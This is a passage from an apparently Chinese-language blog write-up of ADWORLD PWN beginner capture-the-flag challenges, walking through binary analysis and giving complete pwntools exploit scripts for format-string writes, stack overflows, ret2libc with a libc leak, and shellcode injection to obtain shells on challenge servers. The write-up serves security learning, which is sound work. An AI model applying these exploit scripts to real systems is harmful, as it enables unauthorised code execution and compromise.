+<li> <strong><code>%n</code>：输出到目前为止所写的字符数</strong></li>
+</ol>
+</li>
+<li><p>此处需要注意的是<code>%n</code>，它的功能是将<code>%n</code>之前打印出来的字符个数，赋值给一个变量，举例如下</p>
+ <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">'hello world%n hello'</span>, &amp;a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">'a = %d'</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">// 输出"hello world hello  a = 11"</span></span><br></pre></td></tr></table></figure>
+
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210127183343.png" style="zoom:50%;"></li>
+</ol>
+</li>
+</ol>
+</li>
+<li><p> 由此利用该漏洞给pwnme赋值；</p>
+</li>
+<li><p>查看pwnme的地址为<code>0x0804A068</code>；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210127183550.png" style="zoom:50%;"></li>
+<li><p>如何利用：</p>
+<ol>
+<li> 将pwnme的地址输入到message；</li>
+<li> 在合适的位置上加一个<code>%n</code>，使其与输入的地址对应从而造成漏洞利用；</li>
+</ol>
+</li>
+<li><p>查看栈偏移：</p>
+<ol>
+<li><p>在message中输入<code>aaaa-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x</code>，由于<code>printf(%s)</code>，所以输入的内容会在显示在命令行中，查看输出结果如下；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210127184609.png" style="zoom:50%;"></li>
+<li><p> 输出结果中中<code>61616161</code>是<code>aaaa</code>的十六进制ACSII编码，在第10个位置，因此偏移量为10；</p>
+</li>
+</ol>
+</li>
+<li><p>构造payload如下</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwnme_addr = <span class="number">0x0804A068</span></span><br><span class="line">payload = p32(pwnme_addr)+ <span class="string">'aaaa'</span> + <span class="string">'%10$n'</span></span><br></pre></td></tr></table></figure>
+
+<p> pwnme的地址需要经过32位编码转换，四位，而要求pwnme等于8，所以加上<code>aaaa</code>；</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>,<span class="number">62194</span>)</span><br><span class="line"><span class="comment"># p = process('./CGfsb')</span></span><br><span class="line">pwnme_addr = <span class="number">0x0804A068</span></span><br><span class="line">payload = p32(pwnme_addr)+ <span class="string">'aaaa'</span> + <span class="string">'%10$n'</span></span><br><span class="line">p.sendline(<span class="string">'leeyuxun'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
+<li><p>执行paylaod,成功拿到flag；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210127185953.png" style="zoom:50%;"></li>
+</ol>
+</li>
+</ol>
+<h2 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h2><p>栈溢出，覆盖变量！</p>
+<ol>
+<li><p>checksec查看，开启RELOR、NX和栈保护；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309171152.png" style="zoom:50%;"></li>
+<li><p>放入IDA中分析；</p>
+<ol>
+<li><p>main()函数；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309171527.png" style="zoom:50%;"></li>
+<li><p>分析；</p>
+<ol>
+<li> 程序要求先输入Birth，限制不能为1926；</li>
+<li> 然后输入名字，使用<code>gets()</code>函数；</li>
+<li> 输入完名字后判断Birth是否为1926，只有是1926才会执行<code>cat flag</code>；</li>
+<li> <code>gets()</code>函数存在站溢出漏洞，只需输入名字<code>v4</code>时覆盖Birth即<code>v5</code>即可，这里<code>v4</code>和<code>v5</code>之间的距离为<code>0x08</code>；</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><p>构造payload如下</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">born = <span class="number">1926</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">8</span> + p32(born)</span><br></pre></td></tr></table></figure>
+
+<p> 最终payload为</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'111.200.241.244'</span>,<span class="number">42505</span>)</span><br><span class="line"><span class="comment">#p = process('./when_did_you_born')</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">born = <span class="number">1926</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">8</span> + p32(born)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
+<li><p>执行payload，成功拿到flag；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309172717.png" style="zoom:50%;"></li>
+</ol>
+<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>栈溢出，覆盖返回地址！</p>
+<ol>
+<li><p>checksec查看，开启了NX；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309192516.png" style="zoom:50%;"></li>
+<li><p>放入IDA分析；</p>
+<ol>
+<li><p><code>main()</code>函数</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309192857.png" style="zoom:50%;"></li>
+<li><p><code>vulnerable_function()</code>函数</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309192932.png" style="zoom:50%;"></li>
+<li><p><code>callsystem()</code>函数</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309193014.png" style="zoom:50%;"></li>
+<li><p>分析</p>
+<ol>
+<li><p> <code>main()</code>函数调用<code>vulnerable_function()</code>函数；</p>
+</li>
+<li><p> <code>vulnerable_function()</code>函数的<code>read()</code>函数最多可读取<code>0x200</code>字节，而buf变量的空间最多容纳<code>0x80</code>字节，此处存在栈溢出漏洞；</p>
+</li>
+<li><p> <code>callsystem()</code>函数调用了system的<code>/bin/sh</code>，通过覆盖将返回地址改为<code>callsystem()</code>函数地址即可getshell；</p>
+</li>
+<li><p><code>callsystem()</code>函数地址为<code>0x400596</code>；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309194552.png" style="zoom:50%;"></li>
+<li><p><code>vulnerable_function()</code>函数栈空间填充前后内容如下；</p>
+<table>
+<thead>
+<tr>
+<th align="center">填充前</th>
+<th align="center">填充后</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">……</td>
+<td align="center">……</td>
+</tr>
+<tr>
+<td align="center">ret</td>
+<td align="center">callsystem_addr</td>
+</tr>
+<tr>
+<td align="center">old ebp</td>
+<td align="center">‘a’*0x08</td>
+</tr>
+<tr>
+<td align="center">buf</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">……</td>
+<td align="center">‘a’*0x80</td>
+</tr>
+<tr>
+<td align="center">buf</td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">……</td>
+<td align="center">……</td>
+</tr>
+</tbody></table>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><p>构造payload如下；</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'111.200.241.244'</span>,<span class="number">38908</span>)</span><br><span class="line"><span class="comment">#p = process('./level0')</span></span><br><span class="line"></span><br><span class="line">callsystem_addr = <span class="number">0x400596</span></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x80</span>+<span class="number">0x08</span>) + p64(callsystem_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
+<li><p>执行payload成功getshell；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210309201701.png" style="zoom:50%;"></li>
+</ol>
+<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>栈溢出，覆盖返回地址！</p>
+<ol>
+<li><p>checksec查看，开启RELOR和NX；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310204654.png" style="zoom:50%;"></li>
+<li><p>放入IDA中分析；</p>
+<ol>
+<li><p><code>main()</code>函数</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310204901.png" style="zoom:50%;"></li>
+<li><p><code>vulnerable_function()</code>函数</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310205105.png" style="zoom:50%;"></li>
+<li><p>分析；</p>
+<ol>
+<li><p> 上述两个函数和level0大致相同，栈溢出的溢出点同样在<code>read()</code>函数上；</p>
+</li>
+<li><p>并且level2调用了<code>system()</code>函数，<code>system()</code>函数的执行地址可以通过EFL命令获得；</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">'./level2'</span>)</span><br><span class="line">system_addr=elf.symbols[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure></li>
+<li><p>查看字符串发现<code>/bin/sh</code>命令；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310205604.png" style="zoom:50%;"></li>
+<li><p>可以通过<code>read()</code>栈溢出，在返回函数时用<code>system(/bin/sh)</code>覆盖，输入的payload如下；</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binsh_addr=elf.search(<span class="string">'/bin/sh'</span>).<span class="built_in">next</span>()</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(system_addr) +p32(<span class="number">0</span>) + p32(binsh_addr)</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+</li>
+<li><p>最终payload如下；</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'111.200.241.244'</span>,<span class="number">37199</span>)</span><br><span class="line"><span class="comment"># p = process('./level2')</span></span><br><span class="line">p.recv()</span><br><span class="line">elf = ELF(<span class="string">'./level2'</span>)</span><br><span class="line">system_addr=elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr=elf.search(<span class="string">'/bin/sh'</span>).<span class="built_in">next</span>()</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(system_addr) +p32(<span class="number">0</span>) + p32(binsh_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
+<li><p>执行payload，成功getshell；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310210511.png" style="zoom:50%;"></li>
+</ol>
+<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>libc泄漏，栈溢出，ret2libc！</p>
+<ol>
+<li><p>checksec查看，开启RELOR和NX；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310213428.png" style="zoom:50%;"></li>
+<li><p>放入IDA中分析；</p>
+<ol>
+<li><p><code>main()</code>函数</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310213606.png" style="zoom:50%;"></li>
+<li><p><code>vulnerable_function()</code>函数</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310213628.png" style="zoom:50%;"></li>
+<li><p>分析</p>
+<ol>
+<li><p> 基本和level2相同，栈溢出的溢出点同样在<code>read()</code>函数上；</p>
+</li>
+<li><p>但是并没有调用<code>system()</code>函数，给出了libc文件，显然是<strong>ret2libc</strong>；</p>
+<blockquote>
+<p>  ret2libc即控制函数的执行libc中的函数，通常是返回至某个函数的plt处或者函数的具体位置，即函数对应的got表项的内容。一般情况下，选择执行<code>system('/bin/sh')</code>，需要知道<code>system()</code>函数的地址；</p>
+</blockquote>
+</li>
+<li><p> 由于调用了<code>write()</code>函数，首先第一次溢出泄露<code>write()</code>的地址，算出<code>libc</code>的基地址，通过偏移进而算出<code>system()</code>函数和<code>/bin/sh</code>的实际地址；</p>
+</li>
+<li><p> 接着二次溢出，通过计算出的<code>system()</code>函数和<code>/bin/sh</code>的实际地址，覆盖EIP来getShell；</p>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><p>最终payload如下所示；</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"111.200.241.244"</span>, <span class="number">58141</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level3"</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">vul_func_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">write_offset = libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">binsh_offset = libc.search(<span class="string">'/bin/sh'</span>).<span class="built_in">next</span>()</span><br><span class="line">per_payload = <span class="string">'a'</span>*(<span class="number">0x88</span>+<span class="number">0x04</span>) + p32(write_plt) + p32(vul_func_addr) + p32(<span class="number">0</span>) + p32(write_got) + <span class="string">'a'</span>*<span class="number">0x04</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(per_payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line">libc_base_addr = write_addr - write_offset</span><br><span class="line">system_addr = libc_base_addr + system_offset</span><br><span class="line">binsh_addr = libc_base_addr + binsh_offset</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x88</span>+<span class="number">0x04</span>) + p32(system_addr) + <span class="string">'a'</span>*<span class="number">0x04</span> + p32(binsh_addr)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
+<li><p>执行payload，成功getshell；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210310215656.png" style="zoom:50%;"></li>
+</ol>
+<h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h2><p>算是栈溢出吧！</p>
+<ol>
+<li><p>checksec查看，保护全开；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311141158.png" style="zoom:50%;"></li>
+<li><p>放入IDA中分析；</p>
+<ol>
+<li><p><code>mian()</code>函数</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311143141.png" style="zoom:50%;"></li>
+<li><p><code>sub_C3E()</code>函数</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311143555.png" style="zoom:50%;"></li>
+<li><p>分析</p>
+<ol>
+<li><p> <code>gets()</code>函数存在栈溢出漏洞；</p>
+</li>
+<li><p> <code>sub_C3E()</code>函数可以实现<code>cat flag</code>命令；</p>
+</li>
+<li><p> 执行函数<code>sub_C3E()</code>的前提是连续十次猜对生成的随机数；</p>
+</li>
+<li><p> 只需要覆盖随机数执行的种子seed，按照覆盖的种子生成的随机数输入即可十次全部正确，执行<code>sub_C3E()</code>函数；</p>
+</li>
+<li><p>查看seed在栈中的位置为<code>rbp-10h</code>，而可以栈溢出的<code>v7</code>在栈中的位置为<code>rbp-30h</code>，二者相差了<code>0x20</code>；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311144812.png" style="zoom:50%;"></li>
+<li><p>因此可以构造如下payload实现覆盖seed为0；</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+</li>
+<li><p>按照程序中的方式使用C语言生成以0为seed的十个随机数；</p>
+ <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">    srand(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++){</span><br><span class="line">    	<span class="type">int</span> r = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>, r);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311145853.png" style="zoom:50%;"></li>
+<li><p>构造最终payload如下；</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'111.200.241.244'</span>,<span class="number">57646</span>)</span><br><span class="line"><span class="comment"># p = process('./guess_num')</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Your name:"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
+<li><p>执行payload，输入生成的十个随机数，最终执行函数<code>sub_C3E()</code>，获取flag；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311150325.png" style="zoom:50%;"></li>
+</ol>
+<h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p>格式化字符串！</p>
+<ol>
+<li><p>checksec查看，开启RELOR、stack和NX；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311103929.png" style="zoom:50%;"></li>
+<li><p>放入IDA中分析；</p>
+<ol>
+<li><p><code>main()</code>函数</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311104117.png" style="zoom:50%;">
+
+<ol>
+<li> 调用了<code>alarm()</code>函数，设置计时为60s，程序会在60s后退出； </li>
+<li> 调用<code>sub_400996()</code>函数和<code>sub_400D72()</code>函数；</li>
+<li> 为<code>v3</code>分配8字节的空间，将<code>v3</code>的地址赋值给<code>v4</code>；</li>
+<li> 设置<code>v3</code>的前4个字节存放<code>68</code>，后4个字节存放<code>85</code>，并将高低4字节的地址分别以<code>v4</code>的方式打印出来；</li>
+</ol>
+</li>
+<li><p><code>sub_400996()</code>函数</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311110109.png" style="zoom:50%;">
+
+<ol>
+<li><p>打印提示信息和龙的图案；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311110429.png" style="zoom:50%;">
+
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311110507.png" style="zoom:44%;"></li>
+</ol>
+</li>
+<li><p><code>sub_400D72()</code>函数</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311110630.png" style="zoom:50%;">
+
+<ol>
+<li> 输入名字，要求长度不超过<code>0x0C</code>个字节，如果大于<code>0x0C</code>，则返回<code>main()</code>函数并退出；</li>
+<li> 调用<code>sub_400AD7()</code>函数、<code>sub_400BB9()</code>函数、<code>sub_400CA6()</code>函数；</li>
+</ol>
+</li>
+<li><p><code>sub_400AD7()</code>函数</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311111007.png" style="zoom:50%;">
+
+<ol>
+<li> 打印一大串无聊的文字说明，然后让选择<code>east</code>或者<code>up</code>，只能选择<code>east</code>，否则会一直循环下去，直到程序运行结束；</li>
+<li> 调用了<code>sub_4009DD()</code>函数；</li>
+</ol>
+</li>
+<li><p><code>sub_4009DD()</code>函数</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311111737.png" style="zoom:50%;">
+
+<ol>
+<li> ？？？让循环判断生成的随机数的奇偶性，早晚会<code>exit(0)</code>，显然此处无从下手；</li>
+</ol>
+</li>
+<li><p><code>sub_400BB9()</code>函数</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311112417.png" style="zoom:50%;">
+
+<ol>
+<li> 判断输入是否为1，如果不为1，则直接退出该函数；</li>
+<li> 如果为1，则需要输入两个参数，其中第一个是地址，然后出现语句<code>printf(&amp;format, &amp;format)</code>，存在格式化字符串漏洞；</li>
+</ol>
+</li>
+<li><p><code>sub_400CA6()</code>函数</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311113012.png" style="zoom:50%;">
+
+<ol>
+<li><p> 比较<code>*a1</code>和<code>a1[1]</code>，如果不相等，直接退出结束；</p>
+</li>
+<li><p> 此处<code>*a1</code>是传递的参数<code>v4</code>即分配的<code>v3</code>的低4位地址，而<code>a1[1]</code>则是<code>v3</code>的高4位地址，正常情况下不相等；</p>
+</li>
+<li><p> 如果相等，则调用<code>mmap()</code>函数分配一块大小为<code>0x1000</code>字节的空间，其中第三个参数表示该空间可读可写可执行；</p>
+</li>
+<li><p> 通过<code>read()</code>函数，将输入内容赋值给<code>v1</code>；</p>
+</li>
+<li><p>接着通过执行如下语句，强制将<code>v1</code>转化为可执行函数；</p>
+ <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((<span class="type">void</span> (__fastcall *)(_QWORD, <span class="type">void</span> *))v1)(<span class="number">0LL</span>, v1);</span><br></pre></td></tr></table></figure></li>
+<li><p> 因此只要通过<code>sub_400BB9()</code>函数的格式化字符串漏洞令<code>*a1</code>和<code>a1[1]</code>相等，再利用pwntools自带的shellcraft工具，生成amd64架构下的shellcode，即可获取shell；</p>
+</li>
+<li><p> 回到<code>sub_400BB9()</code>函数中，在获取format的输入前，获取了一次输入并保存到了<code>v2</code>中，在<code>rsp+8h</code>的位置，如果把 <code>printf()</code>函数的原型记作<code>printf(format, args...)</code>，那么<code>v2</code>恰恰是<code>args</code>中的第7个参数； 在cheksec检查中，发现这是64位的程序，前6个参数放在寄存器中，从第七个参数开始压入栈中，因此可以用<code>%7$n</code>来访问并修改；</p>
+</li>
+<li><p> 首先将<code>v4</code>即<code>v3</code>的地址赋值给<code>v2</code>，再接着利用格式化字符串漏洞，将<code>v2</code>的值改为<code>85</code>，即<code>*a1</code>和<code>a1[1]</code>相等；</p>
+</li>
+<li><p><code>v4</code>即<code>v3</code>的地址已经打印出来可以直接获得；</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">'secret[0] is '</span>)</span><br><span class="line">v4 = <span class="built_in">int</span>(p.recvuntil(<span class="string">'\n'</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br></pre></td></tr></table></figure></li>
+<li><p>构造的格式化字符串的payload如下；</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'%85x%7$n'</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><p>最终payload如下</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'111.200.241.244'</span>,<span class="number">44009</span>)</span><br><span class="line"><span class="comment"># p = process('./string')</span></span><br><span class="line">p.recvuntil(<span class="string">'secret[0] is '</span>)</span><br><span class="line">v4 = <span class="built_in">int</span>(p.recvuntil(<span class="string">'\n'</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"What should your character's name be:"</span>)</span><br><span class="line">p.sendline(<span class="string">"leeyuxun"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"So, where you will go?east or up?:"</span>)</span><br><span class="line">p.sendline(<span class="string">'east'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"go into there(1), or leave(0)?:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(v4))</span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">'%85x%7$n'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">rec = p.recvuntil(<span class="string">'SPELL\n'</span>)</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
+<li><p>执行payload，成功getshell；</p>
+ <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210311135444.png" style="zoom:50%;"></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>李钰璕
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://leeyuxun.github.io/ADWORLD-PWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA-WP.html" title="ADWORLD PWN 新手练习区 WP">https://leeyuxun.github.io/ADWORLD-PWN-新手练习区-WP.html</a>
+  </li>
+  <li class="post-copyright-license">
